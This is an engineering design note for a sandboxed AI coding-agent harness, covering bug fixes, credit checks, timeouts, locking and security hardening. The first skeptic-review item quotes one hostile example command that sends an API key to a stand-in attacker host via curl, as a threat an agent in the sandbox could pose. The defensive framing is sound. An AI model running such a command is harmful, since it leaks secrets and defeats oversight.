# simple_dispatch.py / agent_loop.py -- design rationale

Replaces `sandbox_dispatch.py` + the `opencode` CLI it drove. Two files, both
in `.claude/scripts/`:

- `agent_loop.py` -- runs INSIDE the sandbox. Talks directly to OpenRouter's
  chat-completions API (Python stdlib only, no `opencode`). One process, one
  in-memory conversation, one verify loop.
- `simple_dispatch.py` -- runs on the host. Boots a sandbox per row, copies
  in the repo + `agent_loop.py` + a brief, runs it, extracts a patch, tears
  down. A plain `ThreadPoolExecutor` fans this out over multiple rows.

No `opencode`, no plan/critic/split pipeline, no mail/wizard escalation flow.
Kept: the `msb` microsandbox + `--secret OPENROUTER_API_KEY@openrouter.ai`
primitive, which already worked and isn't the thing that was broken.

## Every confirmed bug class, and what specifically prevents it here

| Bug (found investigating the ~$30/day burn) | Old cause | Fix here |
|---|---|---|
| Coordinator dispatched a second process onto the same row while the first was still running, and the duplicate's `prepare_clone` `rmtree`'d the live process's own workdir out from under it | `sd-<issue_id>` container name and `/tmp/sandbox-dispatch-<issue_id>/repo` workdir were shared, unguarded, keyed only by row id -- nothing checked for a live process before dispatching | Every dispatch gets a **unique** name/workdir (`sd-<row>-<8 hex>`, a fresh `tempfile.mkdtemp()`) *and* a real OS file lock (`fcntl.flock`, non-blocking) per row id, acquired before anything is cloned or booted. Two dispatches of the same row cannot collide -- the second one exits immediately with "lock held," full stop. Verified: acquiring the same row's lock twice fails on the second attempt; releasing and re-acquiring succeeds. |
| A compile break introduced mid-"split" was never fed back to the sub-task session that caused it -- `verify()`'s return value was called and discarded (`sandbox_dispatch.py:724`) | Multi-stage pipeline (plan -> critique -> split into N sub-briefs, each a separate `opencode run` -> build-final) with verify only wired into the *final* stage | No pipeline to lose a signal in. `agent_loop.py` is one continuous conversation; verify happens in exactly one place and its result *always* becomes the next message (pass -> exit 0, fail -> the real tail is appended and the same session continues). There is no code path where a verify result can be computed and not acted on. |
| Escalation summaries used canned praise text ("this converged close to green") regardless of what actually happened -- confirmed wrong for `dense-tensor-type-build`, which hit a byte-identical unfixed compile error on all 3 turns | `compose_escalation()`'s templated thesis text | No escalation-composition step exists. On failure the host gets the real, last `verify` tail, verbatim, nothing else. |
| A whole day's dispatches kept failing fast and misleadingly (looked like "zero file changes" model failures) because the OpenRouter account was out of credit | Nothing checked the account balance before dispatching; the harness's own fast-fail check existed for *some* fatal patterns but nothing ran before a sandbox was even booted | `simple_dispatch.py` calls `GET /api/v1/credits` (the account-level prepaid balance) before booting *anything*, and refuses the whole run if the balance is already exhausted. Caught and fixed a real bug in this check while building it: the first draft used `/api/v1/auth/key`'s `limit` field, which is a per-key spending cap (usually `null`/unset) and says nothing about the account's actual balance -- confirmed live against the real exhausted account, where `auth/key` reported "unlimited" while `credits` correctly showed usage $0.17 over the limit. |
| A request with no `max_tokens` gets OpenRouter's default (the model's full context window) as its theoretical ceiling, and the account-affordability check rejects the WHOLE call if it can't cover that ceiling, even when a normal-sized completion would fit fine | opencode's own request construction, not configurable from the old harness | `agent_loop.py` always sends an explicit `max_tokens` (default 4096, `--max-tokens` overridable). Confirmed live: without it, a request was rejected as unaffordable at "up to 131072 tokens"; this exists specifically to avoid that. |
| Multi-stage pipeline (GLM plan phase + cheap-model critique + per-split builds + final build turns) burned tokens and dollars on stages whose contribution to actual outcomes was never demonstrated -- 4 of 5 rows that never landed showed real, costly repeated-identical-error thrashing across multiple full pipeline stages | Plan/critique/split apparatus ran on every row regardless of whether it helped | Gone entirely. One model, one loop. If a stronger-model escalation is ever wanted, it's a `--model` flag on this same script, not a second pipeline. |
| opencode-specific operational bugs: `opencode run` hangs forever on non-TTY stdin without `< /dev/null`; `--continue` reads a stale on-disk session; `OPENCODE_MODEL` doesn't persist across invocations; `--agent plan`/`--agent build` mode selection; `opencode.jsonc` permission config needed just to run headless | All specific to depending on the `opencode` CLI's own session/config machinery | No `opencode` dependency at all. `agent_loop.py` is a single Python process holding its own message list in memory for the life of one attempt -- there is no session file, no env-var-based mode switch, no permission config to write. |

## What's deliberately NOT here (yet), on purpose

- No mail/wizard escalation flow. On failure, the host just gets the real
  tail and a patch (if one exists). A human reads it directly. Simpler by
  construction; add ceremony back only if the plain version proves
  insufficient.
- No plan-phase "search for a refactor first" step. It's not proven to have
  paid for itself, and it was itself a source of complexity/cost.
- No board.yaml coupling. `simple_dispatch.py` takes row ids + a directory of
  `<row_id>.txt` brief files directly; wiring it into the board is a
  separate, later step once the core loop is trusted.

## Verified so far (2026-09-09)

- Both files pass `py_compile`.
- `agent_loop.py`'s tool functions (`read_file`, `write_file`, `run_bash`,
  `truncate`) tested directly and behave correctly, including nested-dir
  creation on `write_file`.
- The `fcntl`-based per-row lock: acquire -> second acquire fails -> release
  -> re-acquire succeeds, confirmed directly.
- Full pipeline smoke test (real `msb` sandbox boot, real repo clone into it,
  real copy of `agent_loop.py`, real exec, real OpenRouter HTTP call,
  teardown) run end-to-end. The OpenRouter call correctly hit the account's
  real (still exhausted, confirmed via `/api/v1/credits`) balance limit and
  `agent_loop.py` correctly detected it as FATAL and exited 2, which
  `simple_dispatch.py` correctly surfaced as `fatal=True` with no retry
  wasted. This is the one bug class (blind redispatch into a dead account)
  the whole investigation identified as a real, recurring cost -- confirmed
  fixed under real conditions, not simulated ones.
- **Full real run, end to end, with actual credit**: after capping
  `max_tokens` (see above), a real request to `deepseek/deepseek-v4-flash-0731`
  went through despite the account showing negative balance -- the affordability
  check evidently has some slack for small requests. `agent_loop.py` ran a
  genuine multi-turn tool-calling session (attempt 1: 6 turns; the resulting
  `just check` hit a real, pre-existing, unrelated flaky test -- missing
  `tsc` binary in the snapshot -- and correctly reported RED with the real
  tail) and, on retry with that real failure fed back as the next message
  (attempt 2: 12 more turns), reached genuine GREEN. This is the core design
  claim -- verify always drives the next step, in one continuous session --
  validated under real conditions, not simulated ones.
- **A second real bug found by this same run, now fixed**: the task
  (`write_file` a root-level `hello.txt`) completed and verified green, but
  the file was never committed inside the sandbox. Cause: the commit step
  had copied `sandbox_dispatch.py`'s own `ensure_committed()` pattern
  verbatim -- `git add -u` (tracked files only) plus a scan for untracked
  files that filters on `grep /`, i.e. only picks up untracked files inside
  a subdirectory. A root-level new file is invisible to both halves of that
  pattern. Confirmed live (hello.txt sat as `??` in `git status` after the
  "commit" step ran) and fixed by replacing the whole thing with a plain
  `git add -A`. Re-verified directly against the still-running sandbox from
  the failed run: `git add -A && git commit` picked up hello.txt correctly,
  and `git format-patch` produced a clean, valid patch from it.
- **Not yet tested**: multi-row parallel fan-out under `ThreadPoolExecutor`
  (this run was a single row). The mechanism itself (independent per-row
  locks, independent sandboxes, independent workdirs) has no shared state to
  race on, so there's no reason to expect it behaves differently at N>1, but
  that's an inference, not a demonstrated result -- worth an explicit test
  with 3+ rows once there's more to dispatch.

## Skeptic round 1 (purely theoretical, no live testing) -- 6 issues found and fixed

1. **No explicit `--on-secret-violation`.** `msb run --help` documents no
   default for what happens when a secret leaks to a disallowed host, so a
   model-run `curl evil.com?k=$OPENROUTER_API_KEY` could exfiltrate the live
   key on whatever the undocumented default turns out to be. Now set
   explicitly to `block-and-terminate`.
2. **Non-`HTTPError` exceptions and HTTP-200-with-embedded-error bodies were
   uncaught.** A transient `URLError`/timeout crashed the whole process with
   no `VERIFIED_GREEN`/`VERIFY_FAILED`/`FATAL:` marker at all, which the host
   side would then silently read as a plain RED with no explanation. Worse:
   OpenRouter can return HTTP 200 with an `{"error": ...}` body for some
   upstream failures (including some out-of-credit conditions), which used
   to crash on an unhandled `KeyError` reading `choices[0]` -- silently
   reintroducing the exact "look like a normal failure, actually an account
   problem" bug this rewrite exists to fix. Both are now caught and
   classified explicitly before the response is trusted.
3. **The outer timeout couldn't fit the real workload.** `verify()`'s own
   ceiling is 1800s per call, but the *whole* agent_loop.py invocation (every
   retry, every turn, every verify) was ALSO wrapped in `timeout 1800` on the
   host side -- one cold-cache verify pass could consume the entire budget
   before a second retry ever got a chance, making the retry-cap silently
   unreachable on real (Rust/LLVM) work. Now a separate, generous
   `--overall-timeout` (default 5400s) sized to fit multiple verify passes
   with real slack, not rounded up from a single one.
4. **The credit preflight failed OPEN on its own errors.** Any exception
   other than a clean HTTP error (a network blip, DNS failure) let dispatch
   proceed with an unknown balance -- a softer version of the exact bug this
   check exists to prevent. Now fails CLOSED: refuses to dispatch on an
   inconclusive check rather than guessing.
5. **`workdir` (and everything in it besides the already-removed clone) was
   never cleaned up** -- a permanent per-dispatch directory leak, the same
   disk-fill shape as the old harness's worktree-target-dir incident. Patches
   now get written into `RESULT_DIR` and the whole `workdir` is removed
   unconditionally in the `finally` block.
6. **No timeout on the `git clone`/`fetch`/`checkout` calls**, unlike every
   `msb` call. A network stall there hung the worker thread -- and that row's
   lock -- indefinitely with no recovery path. Now timed out explicitly.

All six fixed in code and re-verified locally (tool functions, lock
exclusion, and the concurrent-dispatch-with-one-crash test all still pass
after the changes).

## Skeptic round 2 (purely theoretical) -- 5 more issues found and fixed

1. **The outer OS-level `timeout` kill was indistinguishable from a real
   RED** -- exactly the "operator can't tell why it failed" bug class this
   rewrite exists to fix, just relocated. Fixed properly: `agent_loop.py`
   now tracks its own wall-clock budget (`--wall-clock-budget`, checked
   before every turn) and stops CLEANLY with a distinct `OUT_OF_TIME`
   marker and exit code 3 well before the outer timeout would need to fire.
   `simple_dispatch.py` computes that budget from its own `--overall-timeout`
   (leaving room for one more verify() pass past the deadline) and passes
   it through explicitly, and classifies `OUT_OF_TIME`/RC=124/137/143 as
   their own `timed_out` category, never folded into plain RED.
2. **`messages` grew unboundedly across turns AND retry attempts**, with
   no trimming -- a long task could hit the model's own context limit,
   silently burning the rest of the retry budget on calls that could never
   succeed. Fixed with `trim_messages()`: once the conversation exceeds
   200k chars, it drops the OLDEST complete turns (never the system prompt
   or the original task message), a full assistant-message-plus-its-tool-
   replies at a time so nothing is left orphaned.
3. **`run_bash`'s 300s timeout never bounded a backgrounded process** --
   `./server & disown` returned immediately and kept running across
   retries. First fix attempt (`start_new_session=True` + `proc.communicate
   (timeout=300)` + `os.killpg` after) had a real bug caught by directly
   testing it, not just reasoning about it: `communicate()` blocks until
   the pipe's write end is closed by EVERY process that inherited it,
   including the backgrounded child -- confirmed live, a `sleep 30 &` job
   made every such call hang for the full 300s even though the foreground
   shell returned in milliseconds. Fixed by polling `proc.poll()` for the
   foreground shell's own exit, killing its process group immediately, and
   only then reading the now-EOF pipe. Verified directly: elapsed time back
   down to ~0.05s, and the specific spawned child process (tracked by pid,
   not by an ambiguous `pgrep -f` pattern that can match a test script's
   own source text) confirmed dead afterward.
4. **Unsanitized shell interpolation and no `row_id` validation** -- `model`
   was embedded unquoted into a `sh -c` string, and `row_id` (used in a lock
   file path, sandbox name, and git branch name) had no charset check, so a
   value containing `/`, `..`, or shell metacharacters was a path-traversal
   or command-injection vector. Fixed: `row_id` validated against
   `^[A-Za-z0-9_-]+$` before anything else happens, `model` (and every other
   interpolated value) passed through `shlex.quote()`.
5. **A patch got produced and returned even for FATAL/RED/TIMEOUT runs**
   with nothing marking it as such -- the same "data present, easy to
   misuse" shape as the original discarded-`verify()` bug, just moved to the
   consumer side. Fixed: the summary output now explicitly labels a non
   -GREEN patch "(UNVERIFIED, do not land)".

Minor: the per-row lock file was truncated (`open(path, "w")`) before even
attempting to acquire it, wiping the current holder's PID for anyone
inspecting it mid-contention. Fixed to open non-destructively and only
truncate+write after the lock is actually held.

All five (plus the minor one) fixed in code and re-verified: row-id
validation rejects both a path-traversal and a shell-metacharacter payload;
the lock, concurrency, and crash-isolation tests still pass with the new
`Result.timed_out` field added; the background-process fix re-tested in
isolation and confirmed the specific spawned child no longer survives.
